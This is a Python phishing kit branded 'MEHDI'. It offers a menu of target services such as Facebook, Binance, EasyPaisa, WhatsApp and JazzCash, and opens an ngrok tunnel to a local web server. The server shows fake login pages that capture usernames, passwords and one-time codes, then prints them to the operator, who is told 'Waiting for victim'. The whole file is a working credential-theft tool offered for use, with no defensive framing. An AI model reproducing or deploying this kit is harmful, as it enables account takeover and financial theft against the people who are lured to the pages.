import os
import subprocess
import time
import http.server
import socketserver

PORT = 8080

def show_menu():
    os.system('clear')
    print("\033[1;31m")
    print("  __  __  ______  _    _  _____  _____ ")
    print(" |  \/  ||  ____|| |  | ||  __ \|_   _|")
    print(" | \  / || |__   | |__| || |  | | | |  ")
    print(" | |\/| ||  __|  |  __  || |  | | | |  ")
    print(" | |  | || |____ | |  | || |__| |_| |_ ")
    print(" |_|  |_||______||_|  |_||_____/|_____|")
    print("\n\033[1;36m       --- POWERED BY MEHDI ---")
    print("\033[1;34m" + "="*45)
    print("\033[1;37m [1] Facebook   [2] Binance   [3] EasyPaisa")
    print(" [4] TikTok     [5] WhatsApp  [6] PUBG")
    print(" [7] JazzCash   [8] Instagram [9] Telegram")
    print("\033[1;34m" + "="*45)
    
    choice = input("\n\033[1;33m[+] MEHDI, select target: \033[0m")
    apps = {"1":"Facebook", "2":"Binance", "3":"EasyPaisa", "4":"TikTok", "5":"WhatsApp", "6":"PUBG", "7":"JazzCash", "8":"Instagram", "9":"Telegram"}
    return apps.get(choice, "Facebook")

def start_ngrok():
    print("\033[1;32m[*] MEHDI, generating link...\033[0m")
    os.system("pkill ngrok")
    time.sleep(1)
    subprocess.Popen(['ngrok', 'http', str(PORT)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(4)
    import requests
    return requests.get("http://localhost:4040/api/tunnels").json()['tunnels'][0]['public_url']

class MehdiHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        app = self.path.split('=')[-1] if 'type=' in self.path else "Secure"
        
        # WhatsApp ke liye QR Code aur baaki ke liye Login
        content = ""
        if "WhatsApp" in app:
            content = f"<h3>Scan QR to Link Device</h3><img src='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=MEHDI_HACK' style='margin:20px;'><p>Scan this in WhatsApp > Linked Devices</p>"
        else:
            content = f"<h3>{app} Login</h3><input type='text' id='u' placeholder='Username'><br><input type='password' id='p' placeholder='Password'><br><button class='btn' onclick='next()'>Login</button>"

        html = f"""
        <html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>body{{background:#000;color:#fff;text-align:center;font-family:sans-serif;padding:20px;}}
        .box{{background:#111;padding:30px;border-radius:15px;border:1px solid #333;max-width:350px;margin:auto;}}
        input{{width:100%;padding:12px;margin:10px 0;background:#222;border:none;color:#fff;}}
        .btn{{background:#1ed760;padding:12px;width:100%;border:none;font-weight:bold;}}
        #otp{{display:none;}}</style></head>
        <body><div class='box'>{content}
        <div id='otp'><h3>OTP Verification</h3><input type='number' id='o' placeholder='000000'><br><button class='btn' onclick='send()'>Verify</button></div>
        </div><script>
        function next(){{document.getElementById('otp').style.display='block';}}
        function send(){{fetch('/',{{method:'POST',body:JSON.stringify({{App:'{app}',U:document.getElementById('u').value,P:document.getElementById('p').value,O:document.getElementById('o').value}})}});alert('Error: Try Again');location.reload();}}
        </script></body></html>"""
        self.wfile.write(bytes(html, "utf8"))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        print(f"\n\033[1;32m[!] DATA RECEIVED: {self.rfile.read(content_length).decode('utf-8')}")
        self.send_response(200); self.end_headers()

selected = show_menu()
url = start_ngrok()
print(f"\n\033[1;32m[✔] LINK: {url}/?type={selected}\n\033[1;33m[*] Waiting for victim...")

with socketserver.TCPServer(("", PORT), MehdiHandler) as httpd:
    httpd.serve_forever()
